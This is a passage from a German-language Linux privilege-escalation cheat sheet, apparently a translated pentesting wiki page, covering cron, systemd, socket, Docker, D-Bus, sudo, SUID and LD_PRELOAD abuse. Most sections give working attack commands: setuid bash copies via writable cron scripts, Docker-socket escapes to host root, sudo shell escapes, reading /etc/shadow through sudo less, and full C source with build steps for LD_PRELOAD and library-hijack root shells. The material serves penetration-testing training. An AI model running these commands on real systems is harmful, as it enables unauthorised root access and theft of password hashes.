Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

Überprüfen Sie, ob ein geplanter Job anfällig ist. Möglicherweise können Sie von einem Skript profitieren, das von root ausgeführt wird (Wildcard-Schwachstelle? Kann Dateien ändern, die root verwendet? Verwenden Sie Symlinks? Erstellen Sie spezifische Dateien im Verzeichnis, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel können Sie im Inneren von _/etc/crontab_ den Pfad finden: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachten Sie, dass der Benutzer "user" Schreibrechte über /home/user hat_)

Wenn der Root-Benutzer in diesem Crontab versucht, einen Befehl oder ein Skript ohne Pfadangabe auszuführen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann können Sie eine Root-Shell erhalten, indem Sie:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Skript und einem Platzhalter (Wildcard-Injection)

Wenn ein Skript von root ausgeführt wird und ein "**\***" in einem Befehl verwendet wird, kann dies ausgenutzt werden, um unerwartete Dinge zu tun (wie z.B. Privilege Escalation). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard-Zeichen von einem Pfad wie** _**/some/path/\*** **gefolgt wird, ist es nicht anfällig (sogar** _**./\*** **ist es nicht).**

Lesen Sie die folgende Seite für weitere Tricks zur Ausnutzung von Wildcards:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Überschreiben von Cron-Skripten und Symlink

Wenn Sie ein Cron-Skript, das von root ausgeführt wird, **ändern können**, können Sie sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das Skript, das von root ausgeführt wird, ein **Verzeichnis verwendet, auf das Sie vollen Zugriff haben**, könnte es nützlich sein, dieses Verzeichnis zu löschen und **einen symbolischen Link zu einem anderen Verzeichnis zu erstellen**, in dem ein von Ihnen kontrolliertes Skript ausgeführt wird.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige Cron-Jobs

Sie können die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht können Sie dies ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0,1 Sekunden während 1 Minute zu überwachen**, **nach weniger ausgeführten Befehlen zu sortieren** und die am häufigsten ausgeführten Befehle zu löschen, können Sie Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden gestarteten Prozess auf).

### Unsichtbare Cron-Jobs

Es ist möglich, einen Cron-Job zu erstellen, **indem Sie einen Wagenrücklauf nach einem Kommentar setzen** (ohne Zeilenumbruchzeichen), und der Cron-Job wird funktionieren. Beispiel (beachten Sie das Wagenrücklaufzeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_-Dateien

Überprüfen Sie, ob Sie eine beliebige `.service`-Datei schreiben können. Wenn Sie dies können, können Sie sie möglicherweise so ändern, dass sie Ihre Hintertür ausführt, wenn der Dienst gestartet, neu gestartet oder gestoppt wird (möglicherweise müssen Sie warten, bis die Maschine neu gestartet wird).\
Erstellen Sie zum Beispiel Ihre Hintertür in der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Dienst-Binärdateien

Beachten Sie, dass Sie, wenn Sie **Schreibberechtigungen für Binärdateien haben, die von Diensten ausgeführt werden**, diese für Hintertüren ändern können, sodass die Hintertüren ausgeführt werden, wenn die Dienste erneut ausgeführt werden.

### systemd PATH - Relative Pfade

Sie können den von **systemd** verwendeten PATH mit folgendem Befehl anzeigen:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfades schreiben können, besteht möglicherweise die Möglichkeit, Berechtigungen zu eskalieren. Sie müssen nach relativen Pfaden suchen, die in den Konfigurationsdateien von Diensten verwendet werden, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstellen Sie eine **ausführbare** Datei mit dem **gleichen Namen wie die relative Pfad-Binärdatei** im systemd-PATH-Ordner, in dem Sie schreiben können. Wenn der Dienst aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird Ihre **Hintertür ausgeführt** (unprivilegierte Benutzer können normalerweise keine Dienste starten/stoppen, aber überprüfen Sie, ob Sie `sudo -l` verwenden können).

**Erfahren Sie mehr über Dienste mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd-Einheitsdateien, deren Name mit `**.timer**` endet und `**.service**`-Dateien oder Ereignisse steuern. **Timer** können als Alternative zu Cron verwendet werden, da sie eine integrierte Unterstützung für Kalenderzeitereignisse und monotone Zeitereignisse haben und asynchron ausgeführt werden können.

Sie können alle Timer mit dem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn Sie einen Timer ändern können, können Sie ihn dazu bringen, bestimmte Einheiten von systemd auszuführen (wie eine `.service` oder ein `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie lesen, was die Einheit ist:

> Die Einheit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Einheitsname, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, wird dieser Wert standardmäßig auf eine Dienstleistung gesetzt, die den gleichen Namen wie die Timer-Einheit hat, außer dem Suffix. (Siehe oben.) Es wird empfohlen, dass der aktivierten Einheit und dem Einheitsnamen der Timer-Einheit identische Namen gegeben werden, außer dem Suffix.

Um diese Berechtigung auszunutzen, müssten Sie daher:

* Eine systemd-Einheit (wie eine `.service`) finden, die eine **beschreibbare ausführbare Datei** ausführt.
* Eine systemd-Einheit finden, die einen **relativen Pfad ausführt** und Sie haben **Schreibrechte** über den **systemd-Pfad** (um diese ausführbare Datei zu imitieren).

**Erfahren Sie mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Rechte und führen Sie aus:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachten Sie, dass der **Timer** aktiviert wird, indem ein Symlink dazu in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird.

## Sockets

Unix-Domain-Sockets (UDS) ermöglichen die **Kommunikation zwischen Prozessen** innerhalb von Client-Server-Modellen auf derselben oder verschiedenen Maschinen. Sie nutzen Standard-Unix-Deskriptor-Dateien für die zwischencomputergestützte Kommunikation und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahren Sie mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber eine Zusammenfassung wird verwendet, um anzuzeigen, **wo der Socket lauschen soll** (der Pfad der AF\_UNIX-Socket-Datei, die IPv4/6- und/oder Portnummer zum Lauschen usw.).
* `Accept`: Nimmt ein boolesches Argument an. Wenn **true**, wird für jede eingehende Verbindung eine **Serviceinstanz gestartet** und nur der Verbindungssocket wird an sie übergeben. Wenn **false**, werden alle lauschenden Sockets selbst an die gestartete Serviceeinheit **übergeben**, und es wird nur eine Serviceeinheit für alle Verbindungen gestartet. Dieser Wert wird für Datagramm-Sockets und FIFOs ignoriert, bei denen eine einzelne Serviceeinheit bedingungslos den gesamten eingehenden Datenverkehr verarbeitet. **Standardmäßig false**. Aus Leistungsgründen wird empfohlen, neue Daemons nur in einer für `Accept=no` geeigneten Weise zu schreiben.
* `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen an, die **vor** oder **nach** dem Erstellen bzw. Binden der lauschenden **Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
* `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** oder **nach** dem Schließen bzw. Entfernen der lauschenden **Sockets**/FIFOs **ausgeführt** werden.
* `Service`: Gibt den Namen der **Serviceeinheit** an, die bei **eingehendem Datenverkehr** aktiviert werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Standardmäßig wird der Service verwendet, der denselben Namen wie der Socket trägt (mit dem Suffix ersetzt). In den meisten Fällen sollte es nicht erforderlich sein, diese Option zu verwenden.

### Beschreibbare .socket-Dateien

Wenn Sie eine **beschreibbare** `.socket`-Datei finden, können Sie am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die Backdoor wird vor der Erstellung des Sockets ausgeführt. Daher müssen Sie **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
Beachten Sie, dass das System diese Socket-Dateikonfiguration verwenden muss, damit die Backdoor ausgeführt wird.

### Beschreibbare Sockets

Wenn Sie einen **beschreibbaren Socket** identifizieren (jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurationsdateien `.socket`), können Sie mit diesem Socket kommunizieren und möglicherweise eine Schwachstelle ausnutzen.

### Unix-Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung

Eine Rohverbindung bezieht sich auf eine direkte Verbindung zu einem System oder einer Anwendung ohne die Verwendung von Protokollen oder Schnittstellen. Dies ermöglicht es einem Angreifer, auf eine niedrigere Ebene des Systems zuzugreifen und potenziell privilegierte Aktionen auszuführen. Eine Rohverbindung kann verwendet werden, um Schwachstellen in der Sicherheit auszunutzen und eine Privilegieneskalation durchzuführen. Es ist wichtig zu beachten, dass eine Rohverbindung ein hohes Maß an technischem Wissen erfordert und in den meisten Fällen nicht legal ist, es sei denn, sie wird im Rahmen einer autorisierten Penetrationstest durchgeführt.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitationsbeispiel:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP-Sockets

Beachten Sie, dass möglicherweise einige **Sockets auf HTTP-Anfragen lauschen** (_Ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Sie können dies mit folgendem Befehl überprüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket mit einer HTTP-Anfrage antwortet, können Sie mit ihm kommunizieren und möglicherweise eine Schwachstelle ausnutzen.

### Beschreibbarer Docker-Socket

Der Docker-Socket, der oft unter `/var/run/docker.sock` zu finden ist, ist eine wichtige Datei, die gesichert werden sollte. Standardmäßig ist er vom Benutzer `root` und den Mitgliedern der Gruppe `docker` beschreibbar. Wenn Sie Schreibzugriff auf diesen Socket haben, kann dies zu einer Privileg-Eskalation führen. Hier ist eine Aufschlüsselung, wie dies gemacht werden kann und alternative Methoden, wenn die Docker CLI nicht verfügbar ist.

#### **Privileg-Eskalation mit Docker CLI**

Wenn Sie Schreibzugriff auf den Docker-Socket haben, können Sie Privilegien mit den folgenden Befehlen eskalieren:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es Ihnen, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker-API**

Wenn die Docker-Befehlszeilenschnittstelle nicht verfügbar ist, kann der Docker-Socket dennoch mithilfe der Docker-API und `curl`-Befehlen manipuliert werden.

1. **Docker-Images auflisten:**
Rufen Sie die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Container erstellen:**
Senden Sie eine Anfrage zum Erstellen eines Containers, der das Wurzelverzeichnis des Hostsystems einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starten Sie den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Mit dem Container verbinden:**
Verwenden Sie `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet wurde, können Sie Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausführen.

### Andere Möglichkeiten

Beachten Sie, dass Sie, wenn Sie Schreibberechtigungen für den Docker-Socket haben, weil Sie **in der Gruppe `docker`** sind, [**weitere Möglichkeiten haben, Privilegien zu eskalieren**](interesting-groups-linux-pe/#docker-group). Wenn die [**Docker-API auf einem Port lauscht, können Sie sie auch kompromittieren**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Überprüfen Sie **weitere Möglichkeiten, aus Docker auszubrechen oder es zu missbrauchen, um Privilegien zu eskalieren** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) Privilege Escalation

Wenn Sie feststellen, dass Sie den Befehl **`ctr`** verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Privilegien zu eskalieren**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** Privilege Escalation

Wenn Sie feststellen, dass Sie den Befehl **`runc`** verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Privilegien zu eskalieren**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process Communication (IPC)-System**, das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Es wurde mit dem modernen Linux-System im Hinterkopf entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC, das den Datenaustausch zwischen Prozessen verbessert und an erweiterte UNIX-Domänensockets erinnert. Darüber hinaus unterstützt es das Senden von Ereignissen oder Signalen, um eine nahtlose Integration zwischen Systemkomponenten zu fördern. Zum Beispiel kann ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf einen Musikplayer zum Stummschalten veranlassen und so die Benutzererfahrung verbessern. Darüber hinaus unterstützt D-Bus ein Remote-Objektsystem, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse vereinfacht, die traditionell komplex waren.

D-Bus arbeitet nach einem **Zulassen/Verweigern-Modell** und verwaltet Berechtigungen für Nachrichten (Methodenaufrufe, Signalabgaben usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinienregeln. Diese Richtlinien legen Interaktionen mit dem Bus fest und ermöglichen potenziell eine Privilegieneskalation durch die Ausnutzung dieser Berechtigungen.

Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird bereitgestellt, in der die Berechtigungen für den Root-Benutzer zum Besitzen, Senden und Empfangen von Nachrichten von `fi.w1.wpa_supplicant1` festgelegt sind.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten universell, während Richtlinien im "default"-Kontext für alle gelten, die nicht von anderen spezifischen Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahren Sie hier, wie Sie eine D-Bus-Kommunikation aufzählen und ausnutzen können:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Netzwerk**

Es ist immer interessant, das Netzwerk aufzuzählen und die Position der Maschine herauszufinden.

### Allgemeine Aufzählung
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfen Sie immer die Netzwerkdienste, die auf der Maschine ausgeführt werden, mit der Sie zuvor nicht interagieren konnten, bevor Sie darauf zugreifen:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Überprüfen Sie, ob Sie den Datenverkehr sniffen können. Wenn Sie dies können, könnten Sie in der Lage sein, einige Anmeldeinformationen abzufangen.
```
timeout 1 tcpdump
```
## Benutzer

### Allgemeine Aufzählung

Überprüfen Sie **wer** Sie sind, welche **Berechtigungen** Sie haben, welche **Benutzer** sich im System befinden, welche sich **anmelden** können und welche **Root-Berechtigungen** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Fehler betroffen, der Benutzern mit **UID > INT\_MAX** ermöglicht, Privilegien zu eskalieren. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitieren Sie es** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Überprüfen Sie, ob Sie Mitglied einer **Gruppe** sind, die Ihnen Root-Rechte gewähren könnte:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Zwischenablage

Überprüfen Sie, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie

Eine starke Passwortrichtlinie ist entscheidend für die Sicherheit eines Systems. Hier sind einige bewährte Methoden, um eine effektive Passwortrichtlinie zu implementieren:

- **Passwortlänge**: Setzen Sie eine Mindestlänge für Passwörter fest, um sicherzustellen, dass sie ausreichend komplex sind. Eine Länge von mindestens 8 Zeichen wird empfohlen.

- **Passwortkomplexität**: Verlangen Sie, dass Passwörter eine Kombination aus Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen enthalten. Dadurch wird die Wahrscheinlichkeit von Brute-Force-Angriffen verringert.

- **Passwortablauf**: Legen Sie eine maximale Gültigkeitsdauer für Passwörter fest und erzwingen Sie deren Änderung nach Ablauf dieser Frist. Eine typische Empfehlung ist eine Änderung alle 90 Tage.

- **Passworthistorie**: Verbieten Sie die Verwendung von Passwörtern, die bereits in der Vergangenheit verwendet wurden. Dadurch wird verhindert, dass Benutzer alte, unsichere Passwörter wiederverwenden.

- **Passwortspeicherung**: Speichern Sie Passwörter sicher, indem Sie sie hashen und salzen. Vermeiden Sie die Speicherung von Passwörtern im Klartext.

- **Passwortrichtlinienkommunikation**: Stellen Sie sicher, dass Benutzer über die Passwortrichtlinie informiert werden und verstehen, warum sie wichtig ist. Führen Sie regelmäßige Schulungen und Sensibilisierungsmaßnahmen durch.

- **Zwei-Faktor-Authentifizierung**: Ermutigen Sie Benutzer zur Verwendung von Zwei-Faktor-Authentifizierung, um die Sicherheit ihrer Konten weiter zu erhöhen.

Indem Sie eine strenge Passwortrichtlinie implementieren und Benutzer zur Einhaltung dieser Richtlinie ermutigen, können Sie das Risiko von Passwortangriffen und unbefugtem Zugriff auf Ihr System erheblich reduzieren.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn Sie **ein Passwort** der Umgebung kennen, versuchen Sie sich mit jedem Benutzer mit dem Passwort anzumelden.

### Su Brute

Wenn es Ihnen nichts ausmacht, viel Lärm zu machen und die Binärdateien `su` und `timeout` auf dem Computer vorhanden sind, können Sie versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht auch mit dem Parameter `-a`, Benutzer zu brute-forcen.

## Missbrauch von beschreibbaren Pfaden

### $PATH

Wenn Sie feststellen, dass Sie in einen Ordner des $PATH schreiben können, können Sie möglicherweise Berechtigungen eskalieren, indem Sie eine Hintertür in den beschreibbaren Ordner erstellen, die den Namen eines Befehls hat, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und **nicht aus einem Ordner geladen wird, der sich vor Ihrem beschreibbaren Ordner im $PATH befindet**.

### SUDO und SUID

Es könnte Ihnen erlaubt sein, einen Befehl mit sudo auszuführen oder sie könnten das suid-Bit haben. Überprüfen Sie dies mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen**. Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann es einem Benutzer ermöglichen, einen Befehl mit den Privilegien eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Es ist nun einfach, eine Shell zu erhalten, indem man einen SSH-Schlüssel in das Root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war anfällig für **PYTHONPATH-Hijacking**, um eine beliebige Python-Bibliothek zu laden, während das Skript als Root ausgeführt wird:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Umgehung der Sudo-Ausführung durch Pfade

**Springen** Sie zu anderen Dateien oder verwenden Sie **Symbolic Links**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **Platzhalter** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binärdatei ohne Befehlspfad

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** erteilt wird: _hacker10 ALL= (root) less_, kann dies ausgenutzt werden, indem die PATH-Variable geändert wird.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn eine **suid**-Binärdatei einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (überprüfen Sie immer mit **_strings_** den Inhalt einer seltsamen SUID-Binärdatei).

[Beispiele für auszuführende Payloads.](payloads-to-execute.md)

### SUID-Binärdatei mit Befehlspfad

Wenn die **suid**-Binärdatei einen anderen Befehl mit Angabe des Pfads ausführt, können Sie versuchen, eine Funktion mit dem Namen des Befehls zu erstellen und sie zu exportieren. 

Zum Beispiel, wenn eine suid-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, müssen Sie versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann, wenn Sie das suid-Binary aufrufen, wird diese Funktion ausgeführt

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere gemeinsam genutzte Bibliotheken (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Vorgang wird als Vorladen einer Bibliothek bezeichnet.

Um jedoch die Systemsicherheit aufrechtzuerhalten und zu verhindern, dass diese Funktion insbesondere bei **suid/sgid**-Ausführbaren ausgenutzt wird, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Ausführbare, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Für Ausführbare mit suid/sgid werden nur Bibliotheken in Standardpfaden vorabgeladen, die auch suid/sgid sind.

Eine Privileg Eskalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht es der Umgebungsvariable **LD_PRELOAD**, fortzubestehen und erkannt zu werden, auch wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung von beliebigem Code mit erhöhten Privilegien führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern Sie als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompilieren Sie es**, indem Sie Folgendes verwenden:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich, **erhöhen Sie die Berechtigungen**, indem Sie Folgendes ausführen:
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Eine ähnliche Privilege-Eskalation kann missbraucht werden, wenn der Angreifer die **LD\_LIBRARY\_PATH** Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID-Binärdatei - .so-Injektion

